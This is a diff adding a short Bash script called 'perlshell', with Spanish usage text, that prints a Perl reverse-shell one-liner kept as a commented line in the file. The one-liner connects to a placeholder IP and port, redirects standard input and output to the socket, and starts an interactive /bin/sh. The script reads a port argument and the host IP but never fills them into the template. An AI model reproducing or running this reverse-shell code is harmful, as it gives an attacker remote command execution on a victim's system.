@@ -1,0 +1,14 @@
+#!/bin/bash
+
+if [[ -z $1 ]] ; then
+	echo " "
+	echo "[*]perlshell (+) <puerto escucha>."
+	echo " "
+	exit
+fi
+
+ipx=`hostname -I`
+
+#perl -e 'use Socket;$i="<IP AQUÍ>";$p=<PUERTOESCUCHAAQUÍ>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+
+cat perlshell | tail -3 | head -1
